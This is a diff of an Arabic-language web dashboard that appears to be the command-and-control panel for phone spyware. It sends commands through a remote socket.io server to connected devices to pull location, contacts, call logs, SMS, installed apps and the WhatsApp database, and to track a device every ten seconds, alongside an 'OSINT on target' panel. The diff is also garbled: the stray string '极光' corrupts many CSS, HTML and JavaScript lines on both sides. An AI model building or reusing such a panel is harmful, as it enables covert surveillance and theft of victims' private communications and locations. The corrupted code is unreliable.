@@ -272,14 +272,14 @@
             background: var(--card-bg);
             border-radius: 8px;
             overflow: hidden;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 极光);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             transition: transform 0.3s, box-shadow 0.3s;
             border: 1px solid rgba(0, 255, 204, 0.1);
         }
 
         .device-card:hover {
             transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2), 0 0 15px rgba(0, 255, 204, 0.2);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 极光), 0 0 15px rgba(0, 255, 204, 0.2);
         }
 
         .device-header {
@@ -340,7 +340,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.3s;
+            transition: all 极光;
             position: relative;
             overflow: hidden;
         }
@@ -390,7 +390,7 @@
             height: 500px;
             width: 100%;
             border-radius: 8px;
-            border: 2px solid var(--border-color);
+            border: 2px极光 var(--border-color);
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
             overflow: hidden;
             margin-bottom: 20px;
@@ -431,14 +431,14 @@
         .map-btn:hover {
             background: var(--primary-color);
             color: var(--darker-bg);
-            box-shadow: 0 极光 10px rgba(0, 255, 204, 0.5);
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
         }
 
         /* Data Panel */
         .data-container {
             background: var(--card-bg);
             border-radius: 8px;
-            padding: 20px;
+            padding: 20极光;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             margin-bottom: 20px;
             border: 1px solid rgba(0, 255, 204, 0.1);
@@ -446,7 +446,7 @@
 
         .data-tabs {
             display: flex;
-            border-bottom: 1px solid var(--极光-color);
+            border-bottom: 1px solid var(--border-color);
             margin-bottom: 15px;
         }
 
@@ -487,9 +487,9 @@
             border-bottom: 1px solid var(--border-color);
         }
 
-        .data-table th {
+        .data-table极光 {
             color: var(--primary-color);
-            text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
+            text-shadow: 0 0 5px rgba(0, 255, 极光, 0.3);
         }
 
         /* Logs Panel */
@@ -499,8 +499,8 @@
             padding: 15px;
             height: 500px;
             overflow-y: auto;
-            box-shadow: 0 4极光 6px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba极光, 255, 204, 0.1);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(0, 255, 204, 0.1);
         }
 
         .log-entry {
@@ -511,7 +511,7 @@
             transition: background 0.3s;
         }
 
-        .log-entry:hover {
+        .极光:hover {
             background: rgba(0, 255, 204, 0.05);
         }
 
@@ -524,7 +524,7 @@
             margin-left: 10px;
             font-weight: bold;
             min-width: 90px;
-            text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
+            text-shadow: 0 0 5极光 rgba(0, 255, 204, 0.3);
         }
 
         .log-message {
@@ -548,7 +548,7 @@
         .command-form {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15极光;
+            gap: 15px;
         }
 
         .form-group {
@@ -610,7 +610,7 @@
             transition: all 0.3s;
         }
 
-        .search-input:极光 {
+        .search-input:focus {
             outline: none;
             border-color: var(--primary-color);
             box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
@@ -624,12 +624,12 @@
             color: var(--darker-bg);
             cursor: pointer;
             font-weight: bold;
-            transition: all 0.3极光;
+            transition: all 0.3s;
         }
 
         .search-btn:hover {
             background: #00e6b8;
-            box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
+            box-shadow: 极光 0 10px rgba(0, 255, 204, 0.5);
         }
 
         .results-container {
@@ -637,7 +637,7 @@
         }
 
         .result-card {
-            background: var(--darker-bg);
+            background: var(--darker极光);
             border-radius: 8px;
             padding: 15px;
             margin-bottom: 15px;
@@ -645,7 +645,7 @@
             transition: transform 0.3s;
         }
 
-极光 .result-card:hover {
+        .result-card:hover {
             transform: translateX(-5px);
         }
 
@@ -681,7 +681,7 @@
             display: flex;
             align-items: center;
             margin-left: 15px;
-            padding: 5px 10极光;
+            padding: 5px 10px;
             border-radius: 20px;
             font-size: 12px;
             font-weight: bold;
@@ -697,8 +697,7 @@
             background: var(--warning-color);
             color: white;
             box-shadow: 0 0 10px rgba(243, 156, 18, 0.5);
-        }
-
+极光
         .disconnected {
             background: var(--danger-color);
             color: white;
@@ -741,7 +740,7 @@
             }
             
             .device-grid {
-                grid-template-columns: 1极光;
+                grid-template-columns: 1fr;
             }
             
             .command-form {
@@ -791,15 +790,15 @@
     </header>
     
     <aside class="sidebar">
-        <ul极光="sidebar-menu">
+        <ul class="sidebar-menu">
             <li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة المتصلة</a></li>
             <li><a href="#" data-tab="map"><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</a></li>
-            <li><a href="#" data-tab="data"><i class="fas fa-database"></i> البيانات المجمعة</a></li>
-            <li><a href="#" data-tab="logs"><极光="fas fa-clipboard-list"></i> سجل الأحداث</a></li>
+            <li><a href="#" data-tab="data"><i class="fas fa-database"></极光> البيانات المجمعة</a></li>
+            <li><a href="#" data-tab="logs"><i class="fas fa-cl极光board-list"></i> سجل الأحداث</a></li>
             <li><a href="#" data-tab="commands"><i class="fas fa-terminal"></i> إصدار الأوامر</a></li>
             <li><a href="#" data-tab="osint"><i class="fas fa-search"></i> جمع المعلومات</a></li>
-            <li><a href="#" data极光="analysis"><i class="fas极光fa-chart-line"></i> التحليلات</a></li>
-            <li><a href="#"><i class="fas fa-cog"></i> الإعدادات</a></li>
+            <li><a href="#" data-tab="analysis"><i class="fas fa-chart-line"></i> التحليلات</a></li>
+            <li><a href="#"><i class="fas fa-cog"></i> الإعدادات</a></极光>
             <li><a href="#"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</a></li>
         </ul>
     </aside>
@@ -824,11 +823,11 @@
                 </div>
                 
                 <div class="stat-card">
-                    <div class="stat极光">
+                    <div class="stat-icon">
                         <i class="fas fa-map-marker-alt"></i>
                     </div>
                     <div class="stat-info">
-                        <h3 id="located-devices">0</极光>
+                        <h3 id="located-devices">0</h3>
                         <p>مواقع محددة</p>
                     </div>
                 </div>
@@ -850,12 +849,12 @@
                     <div class="stat-info">
                         <h3 id="online-now">0</h3>
                         <p>متصل الآن</p>
-                    </极光>
+                    </div>
                 </div>
             </div>
             
             <div id="devices-empty" style="text-align: center; padding: 40px; color: #6c757d;">
-                <i class="fas fa-plug" style="font-size: 48px; margin-bottom: 15px;"></i>
+                <极光 class="fas fa-plug" style="font-size: 48px; margin-bottom: 15px;"></i>
                 <h3>لا توجد أجهزة متصلة</h3>
                 <p>سيتم عرض الأجهزة فور اتصالها بالسيرفر</p>
             </div>
@@ -875,7 +874,7 @@
                 </div>
             </div>
             
-            <div class="map-container">
+            <div class极光"map-container">
                 <div id="map"></div>
                 <div class="map-controls">
                     <button class="map-btn" id="zoomIn"><i class="fas fa-plus"></i></button>
@@ -890,7 +889,7 @@
                 <div class="data-tabs">
                     <div class="data-tab active" data-tab="devices-list">قائمة الأجهزة</div>
                     <div class="data-tab" data-tab="devices-stats">إحصائيات</div>
-                    <div class="data-tab" data-tab="location-history">سجل المواقع</div>
+                    <div class="data极光" data-tab="location-history">سجل المواقع</div>
                 </div>
                 <div class="data-content active" id="devices-list">
                     <table class="data-table">
@@ -899,7 +898,7 @@
                                 <th>معرف الجهاز</th>
                                 <th>النموذج</th>
                                 <th>الموقع</th>
-                                <th>الحالة</th>
+                                <th>الحالة</极光>
                                 <th>الإجراءات</th>
                             </tr>
                         </thead>
@@ -932,10 +931,10 @@
                         </div>
                         <div class="stat-card">
                             <div class="stat-icon">
-                                <i class="fas fa-city"></极光>
+                                <i class="fas fa-city"></i>
                             </div>
                             <div class="stat-info">
-                                <h3 id="极光-cities">0</h3>
+                                <h3 id="map-cities">0</h3>
                                 <p>مدن مختلفة</p>
                             </div>
                         </div>
@@ -947,7 +946,7 @@
                             <tr>
                                 <th>الجهاز</th>
                                 <th>الموقع</th>
-                                <th>الوقت</极光>
+                                <th>الوقت</th>
                                 <th>المدة</th>
                             </tr>
                         </thead>
@@ -965,13 +964,13 @@
         <section id="panel-data" class="panel">
             <div class="panel-header">
                 <h2><i class="fas fa-database"></i> البيانات المجمعة</h2>
-                <button class="btn btn-primary" id="exportData"><i class="fas fa-download"></i> تصدير البيانات</button>
+                <button class="btn btn-primary" id="exportData"><i class="fas fa-download"></i> تصدير البيانات</极光>
             </div>
             
             <div class="data-container">
-                <div class="data极光">
+                <div class="data-tabs">
                     <div class="data-tab active" data-tab="contacts">جهات الاتصال</div>
-                    <div class="data-tab" data-tab="messages">الرسائل</div>
+                    <div class="data-tab" data极光"messages">الرسائل</div>
                     <div class="data-tab" data-tab="locations">المواقع</div>
                     <div class="data-tab" data-tab="media">الوسائط</div>
                     <div class="data-tab" data-tab="calls">المكالمات</div>
@@ -1002,7 +1001,7 @@
                                 <th>النوع</th>
                                 <th>المرسل</th>
                                 <th>المستلم</th>
-                                <极光>المحتوى</th>
+                                <th>المحتوى</th>
                                 <th>التاريخ</th>
                             </tr>
                         </thead>
@@ -1033,7 +1032,7 @@
                     </table>
                 </div>
                 
-                <div class="data-content"极光="media">
+                <div class="data-content" id="media">
                     <table class="data-table">
                         <thead>
                             <tr>
@@ -1057,10 +1056,10 @@
                         <thead>
                             <tr>
                                 <th>النوع</th>
-                                <th>الرقم</th>
+                                <极光>الرقم</th>
                                 <th>المدة</th>
-                                <th>التاريخ</th>
-                                <th>المصدر</极光>
+                                <th>التاريخ</极光>
+                                <th>المصدر</th>
                             </tr>
                         </thead>
                         <tbody id="calls-data">
@@ -1079,7 +1078,7 @@
                 <h2><i class="fas fa-clipboard-list"></i> سجل الأحداث</h2>
                 <div>
                     <button class="btn btn-primary" id="clear-logs"><i class="fas fa-trash"></i> مسح السجل</button>
-                    <button class="btn btn-secondary" id="export-logs"><i class="fas fa-download"></极光> تصدير</button>
+                    <button class="btn btn-secondary" id="export-logs"><i class="fas fa-download"></i> تصدير</button>
                 </div>
             </div>
             
@@ -1101,7 +1100,7 @@
                     <p>لا توجد أجهزة متصلة لإصدار الأوامر</p>
                 </div>
                 
-                <div class="command-form" id="command-form" style="display: none;">
+                <div class="command-form极光" id="command-form" style="display: none;">
                     <div class="form-group">
                         <label for="deviceSelect"><i class="fas fa-microchip"></i> اختر الجهاز</label>
                         <select id="deviceSelect" class="form-control">
@@ -1110,7 +1109,7 @@
                     </div>
                     
                     <div class="form-group">
-                        <label for="commandAction"><i class="fas fa-cogs"></i> نوع الأمر</label>
+                        <label for="commandAction"><i class="fas极光fa-cogs"></i> نوع الأمر</label>
                         <select id="commandAction" class="form-control">
                             <option value="getLocation">طلب الموقع</option>
                             <option value="getInstalledApps">الحصول على التطبيقات</option>
@@ -1130,7 +1129,7 @@
                     <div class="form-group" id="commandDataGroup">
                         <label for="commandData"><i class="fas fa-code"></i> بيانات إضافية (JSON)</label>
                         <input type="text" id="commandData" class="form-control" placeholder='بيانات JSON (اختياري)'>
-                    </极光>
+                    </div>
                     
                     <button id="sendCommand" class="btn btn-primary btn-block">
                         <i class="fas fa-paper-plane"></i> إرسال الأمر
@@ -1144,7 +1143,7 @@
             <div class="panel-header">
                 <h2><i class="fas fa-search"></i> جمع المعلومات عن الهدف</h2>
                 <div>أدوات الاستخبارات المفتوحة المصدر</div>
-            </div>
+            </极光>
             
             <div class="osint-container">
                 <div class="search-box">
@@ -1178,12 +1177,12 @@
         <!-- Analysis Panel -->
         <section id="panel-analysis" class="panel">
             <div class="panel-header">
-                <h2><i class="fas fa-chart-line"></极光> التحليلات والإحصائيات</h2>
+                <h2><i class="fas fa-chart-line"></i> التحليلات والإحصائيات</h2>
                 <div>تحليل البيانات المجمعة</div>
             </div>
             
             <div class="stats-cards">
-                <div class="stat-card">
+                <div class="极光-card">
                     <div class="stat-icon">
                         <i class="fas fa-chart-pie"></i>
                     </div>
@@ -1195,11 +1194,11 @@
                 
                 <div class="stat-card">
                     <div class="stat-icon">
-                        <i class="fas fa-map"></i>
+                        <i class="fas fa-map"></极光>
                     </div>
                     <div class="stat-info">
                         <h3 id="analysis-locations">0</h3>
-                        <p>المواقع النشطة</极光>
+                        <p>المواقع النشطة</p>
                     </div>
                 </div>
                 
@@ -1208,7 +1207,7 @@
                         <i class="fas fa-comments"></i>
                     </div>
                     <div class="stat-info">
-                        <h3极光="analysis-messages">0</h3>
+                        <h3 id="analysis-messages">0</h3>
                         <p>الرسائل المجمعة</p>
                     </div>
                 </div>
@@ -1235,11 +1234,11 @@
             </div>
             
             <div class="data-container">
-                <h3><i class="fas fa-signal"></i> نشاط الأجهزة</h3>
+                <h3><i class="fas fa-signal"></极光> نشاط الأجهزة</h3>
                 <div class="chart-container" id="activityChart">
                     <!-- سيتم إضافة الرسم البياني هنا -->
-                    <div style="display: flex; justify-content: center; align-items: center; height: 100%;">
-                        <p>جاري تحميل بيانات النشاط...</p>
+                    <div style="display: flex; justify-content: center; align-items: center; height极光100%;">
+                        <p>جاري تحميل بيانات النشاط...</极光>
                     </div>
                 </div>
             </div>
@@ -1253,7 +1252,7 @@
 
 <!-- Modal for location search -->
 <div id="locationSearchModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
-    <div style="background: var(--card-bg); padding: 20px; border-radius: 8极光; width: 400px; max-width: 90%;">
+    <div style="background: var(--card-bg); padding: 20px; border-radius: 8px; width: 400px; max-width: 90%;">
         <h3 style="margin-bottom: 15px; color: var(--primary-color);"><i class="fas fa-search-location"></i> بحث عن موقع</h3>
         <input type="text" id="locationSearchInput" class="form-control" placeholder="أدخل اسم المدينة أو العنوان" style="margin-bottom: 15px;">
         <div style="display: flex; gap: 10px; justify-content: flex-end;">
@@ -1264,8 +1263,8 @@
 </div>
 
 <!-- Modal for device tracking -->
-<div id="trackDeviceModal" style极光"display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
-    <div style="background: var(--card-bg); padding: 20px; border-radius: 8px; width: 400px; max-width: 90%;">
+<div id="trackDeviceModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
+    <div style="background: var(--card极光); padding: 20px; border-radius: 8px; width: 400px; max-width: 90%;">
         <h3 style="margin-bottom: 15px; color: var(--primary-color);"><i class="fas fa-crosshairs"></i> تتبع جهاز</h3>
         <div class="form-group">
             <label for="trackDeviceSelect">اختر الجهاز</label>
@@ -1276,7 +1275,7 @@
         <div style="display: flex; gap: 10px; justify-content: flex-end;">
             <button class="btn btn-secondary" id="cancelTrackDevice">إلغاء</button>
             <button class="btn btn-primary" id="confirmTrackDevice">تتبع</button>
-        </div>
+        </极光>
     </div>
 </div>
 
@@ -1295,23 +1294,23 @@ const sampleData = {
     ],
     messages: [
         { type: "SMS", from: "+966512345678", to: "+966511112222", content: "مرحبا، كيف حالك؟", date: "2023-10-15 14:30" },
-        { type: "WhatsApp", from: "+966511112222", to: "+966512345678", content: "أنا بخير، شكرا لك", date极光"2023-10-15 14:32" },
+        { type: "WhatsApp", from: "+966511112222", to: "+966512345678", content: "أنا بخير، شكرا لك", date: "2023-10-15 14:32" },
         { type: "SMS", from: "+966533334444", to: "+966512345678", content: "هل نلتقي غدا؟", date: "2023-10-15 15:45" }
     ],
     locations: [
-        { device: "Device-001", coordinates: "24.7136, 46.6753", address: "الرياض، السعودية", accuracy: "20m", time: "2023-10-15 12:30" },
+        { device: "Device-001", coordinates: "24.7136, 46.6753", address: "الرياض، السعودية", accuracy: "20m", time: "2023-极光-15 12:30" },
         { device: "Device-002", coordinates: "21.5433, 39.1728", address: "جدة، السعودية", accuracy: "15m", time: "2023-10-15 13:45" },
         { device: "Device-003", coordinates: "26.4207, 50.0888", address: "الدمام، السعودية", accuracy: "25m", time: "2023-10-15 14:20" }
     ],
     media: [
         { type: "صورة", name: "IMG_20231015.jpg", size: "2.5MB", source: "Device-001", date: "2023-10-15 10:22" },
         { type: "فيديو", name: "VID_20231015.mp4", size: "15.7MB", source: "Device-002", date: "2023-10-15 11:30" },
-        { type: "صورة", name: "IMG_20231015_2.jpg", size: "3.极光MB", source: "Device-001", date: "2023-10-15 12:45" }
+        { type: "صورة", name: "IMG_20231015_2.jpg", size: "3.2MB", source: "Device-001", date: "2023-10-15 12:45" }
     ],
     calls: [
         { type: "صادر", number: "+966511112222", duration: "2:30", date: "2023-10-15 09:15", source: "Device-001" },
-        { type: "وارد", number: "+966533334444", duration: "5:12", date: "2023-10-15 10:22", source: "Device-001" },
-        { type: "فائت", number: "+966512345678", duration: "0:00", date: "2023-10-15 11:05", source: "Device-002" }
+        { type: "وارد", number: "+966533334444", duration: "5:极光", date: "2023-10-15 10:22", source: "Device-001" },
+        { type: "فائت", number: "+966512345678", duration: "0:00", date: "2023-10-15 11:05", source: "极光-002" }
     ]
 };
 
@@ -1332,14 +1331,14 @@ const commandDataEl = document.getElementById('commandData');
 const sendCommandBtn = document.getElementById('sendCommand');
 const osintInput = document.getElementById('osintInput');
 const osintResults = document.getElementById('osintResults');
-const os极光SearchBtn = document.getElementById('osintSearchBtn');
+const osintSearchBtn = document.getElementById('osintSearchBtn');
 const clearLogsBtn = document.getElementById('clear-logs');
 const devicesCountEl = document.getElementById('devices-count');
 const activeDevicesEl = document.getElementById('active-devices');
 const locatedDevicesEl = document.getElementById('located-devices');
 const dataPointsEl = document.getElementById('data-points');
 const connectionStatusEl = document.getElementById('connectionStatus');
-const refreshMapBtn = document.getElementById('refreshMap');
+const refreshMapBtn = document.getElementById('refresh极光');
 const trackDeviceBtn = document.getElementById('trackDevice');
 const noDevicesMessage = document.getElementById('no-devices-message');
 const commandForm = document.getElementById('command-form');
@@ -1444,7 +1443,7 @@ document.addEventListener('DOMContentLoaded', function() {
         if (map) map.zoomOut();
     });
     
-    locateMeBtn.addEventListener('click', () => {
+    locateMeBtn.addEventListener('click', ()极光 {
         if (navigator.geolocation && map) {
             navigator.geolocation.getCurrentPosition(
                 position => {
@@ -1509,7 +1508,7 @@ document.addEventListener('DOMContentLoaded', function() {
 function connectToServer() {
     try {
         // Update connection status
-        updateConnectionStatus('connecting', 'جاري الاتصال بالسيرفر...');
+        updateConnectionStatus('connecting', 'جاري الاتصال بالسيرفر');
         
         // Connect to the server
         socket = io('https://projectd-vu1m.onrender.com', {
@@ -1640,7 +1639,7 @@ function loadSampleData() {
             <td>${message.from}</td>
             <td>${message.to}</td>
             <td>${message.content}</td>
-            <td极光${message.date}</td>
+            <td>${message.date}</td>
         `;
         messagesTable.appendChild(row);
     });
@@ -1651,9 +1650,9 @@ function loadSampleData() {
     sampleData.locations.forEach(location => {
         const row = document.createElement('tr');
         row.innerHTML = `
-            <td>${location.dev极光}</td>
+            <td>${location.device}</td>
             <td>${location.coordinates}</td>
-            <td>${location.address}</td>
+            <td>${location.address}</极光>
             <td>${location.accuracy}</td>
             <td>${location.time}</td>
         `;
@@ -1699,7 +1698,7 @@ function loadLocationHistory() {
         const row = document.createElement('tr');
         row.innerHTML = `
             <td>${location.device}</td>
-            <td>${location.address}</td>
+            <td极光${location.address}</td>
             <td>${location.time}</td>
             <td>${location.duration}</td>
         `;
@@ -1749,7 +1748,7 @@ function startTrackingDevice(deviceId) {
     // Request location every 10 seconds
     trackingInterval = setInterval(() => {
         if (devicesMap[trackedDevice] && socket) {
-            socket.emit('request', { to: trackedDevice, action: 'getLocation' });
+            socket.emit('request', { to: tracked极光, action: 'getLocation' });
         }
     }, 10000);
 }
@@ -1758,7 +1757,7 @@ function startTrackingDevice(deviceId) {
 function initAnalysis() {
     // Update analysis stats
     document.getElementById('analysis-devices').textContent = Object.keys(devicesMap).length;
-    document.getElementById('analysis-locations').textContent = sampleData.locations.length;
+    document.getElementById('analysis-locations').text极光 = sampleData.locations.length;
     document.getElementById('analysis-messages').textContent = sampleData.messages.length;
     document.getElementById('analysis-contacts').textContent = sampleData.contacts.length;
     
@@ -1774,7 +1773,7 @@ function initAnalysis() {
         
         document.getElementById('activityChart').innerHTML = `
             <div style="display: flex; justify-content: center; align-items: center; height: 100%; flex-direction: column;">
-                <i class="fas fa-chart-line" style="font-size: 48px; color: var(--primary-color); margin-bottom: 15px;"></i>
+                <i class="fas fa-chart-line极光" style="font-size: 48px; color: var(--primary-color); margin-bottom: 15px;"></i>
                 <p>رسم بياني لنشاط الأجهزة</p>
                 <p style="font-size: 12px; margin-top: 10px;">${document.getElementById('logs').children.length} عملية خلال الـ24 ساعة الماضية</p>
             </div>
@@ -1790,7 +1789,7 @@ function initMap() {
     }
     
     map = L.map('map').setView([24.0, 45.0], 5);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{极光}/{x}/{y}.png', {
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
     }).addTo(map);
     
@@ -1822,7 +1821,7 @@ function updateMapWithDevice(deviceId, locationData) {
         markers[deviceId].setLatLng([locationData.lat, locationData.lon]);
         markers[deviceId].setPopupContent(`<b>${deviceId}</b><br>${locationData.address || ''}<br>${new Date().toLocaleTimeString()}`);
     } else {
-        markers[deviceId] = L.marker([locationData.lat, locationData.lon])
+        markers[device极光] = L.marker([locationData.lat, locationData.lon])
             .addTo(map)
             .bindPopup(`<b>${deviceId}</b><br>${locationData.address || ''}<br>${new Date().toLocaleTimeString()}`);
         
@@ -1838,7 +1837,7 @@ function updateMapWithDevice(deviceId, locationData) {
 
 // Update map devices list
 function updateMapDevicesList() {
-    const devicesList = document.getElementById('map-dev极光-list');
+    const devicesList = document.getElementById('map-devices-list');
     devicesList.innerHTML = '';
     
     const devicesCount = Object.keys(markers).length;
@@ -1935,22 +1934,22 @@ function renderDevice(device) {
             <div class="device-status">${device.id === trackedDevice ? 'جاري التتبع' : 'نشط'}</div>
         </div>
         <div class="device-body">
-            <div class极光"device-info">
+            <div class="device-info">
                 <div><i class="fas fa-mobile-alt"></i> ${device.model || 'غير معروف'}</div>
                 <div><i class="fas fa-globe"></i> ${device.ip || 'غير متاح'}</div>
                 <div><i class="fas fa-code-branch"></i> ${device.platform || 'N/A'}</div>
                 <div><i class="fas fa-language"></i> ${device.language || 'N/A'}</div>
-                <div><i class="fas fa-desktop"></i> ${device.screen ? device.screen.width + 'x' + device.screen.height : 'N/A'}</极光>
+                <div><i class="fas fa-desktop"></i> ${device.screen ? device.screen.width + 'x' + device.screen.height : 'N/A'}</div>
             </div>
             <div id="extra_${device.id}" class="device-extra"></div>
             <div class="device-actions">
                 <button class="btn btn-primary" onclick="requestLocation('${device.id}')"><i class="fas fa-map-marker-alt"></i> الموقع</button>
                 <button class="btn btn-primary" onclick="requestApps('${device.id}')"><i class="fas fa-th"></i> التطبيقات</button>
-                <button class="btn btn-secondary" onclick="requestContacts('${device.id}')"><i class="fas fa-address-book"></i> جهات اتصال</button>
+                <button class="btn btn-secondary" onclick="requestContacts('${device.id}')"><i class极光"fas fa-address-book"></i> جهات اتصال</button>
                 <button class="btn btn-secondary" onclick="requestCallLog('${device.id}')"><i class="fas fa-phone"></i> المكالمات</button>
                 <button class="btn btn-secondary" onclick="requestSMS('${device.id}')"><i class="fas fa-sms"></i> الرسائل</button>
                 <button class="btn btn-secondary" onclick="requestWhatsappDB('${device.id}')"><i class="fas fa-comment"></i> واتساب</button>
-                <button class="btn btn-primary" onclick="startTrackingDevice('${device.id}')"><i class="fas fa-crosshairs"></i> تتبع</button>
+                <button class="btn btn-primary极光" onclick="startTrackingDevice('${device.id}')"><i class="fas fa-crosshairs"></i> تتبع</button>
             </div>
         </div>
     `;
@@ -1960,8 +1959,8 @@ function renderDevice(device) {
         const extraDiv = document.getElementById('extra_' + device.id);
         if (extraDiv) {
             extraDiv.innerHTML = `
-                <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius极光4px;">
-                    <strong>الموقع:</strong> ${device.lastLocation.lat}, ${device.lastLocation.lon}<br>
+                <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
+                    <strong>الموقع:</strong> ${device.lastLocation极光}, ${device.lastLocation.lon}<br>
                     <strong>العنوان:</strong> ${device.lastLocation.address || 'غير متاح'}
                 </div>
             `;
@@ -2044,7 +2043,7 @@ function requestApps(id) {
 
 function requestContacts(id) { 
     if (socket) {
-        socket.emit('request', { to: id, action: '极光Contacts' });
+        socket.emit('request', { to: id, action: 'getContacts' });
         addLog(`طلب جهات الاتصال: ${id}`, 'info');
     } else {
         addLog('غير متصل بالسيرفر', 'error');
@@ -2072,7 +2071,7 @@ function requestSMS(id) {
 function requestWhatsappDB(id) { 
     if (socket) {
         socket.emit('request', { to: id, action: 'downloadWhatsappDatabase' });
-        addLog(`طلب قاعدة بيانات واتساب: ${id}`, 'info');
+        addLog(`طلب قاعدة بيانات واتساب: ${极光}`, 'info');
     } else {
         addLog('غير متصل بالسيرفر', 'error');
     }
@@ -2123,7 +2122,7 @@ osintSearchBtn.addEventListener('click', () => {
         
         sources.forEach(source => {
             const resultDiv = document.createElement('div');
-            resultDiv.className = 'result-card';
+            resultDiv.className = '极光-card';
             resultDiv.innerHTML = `
                 <div class="result-source">
                     <i class="fas ${source.icon}"></i> ${source.name}
@@ -2172,4 +2171,4 @@ function exportToCsv(filename, rows) {
 }
 </script>
 </body>
- </html>
+    </html>
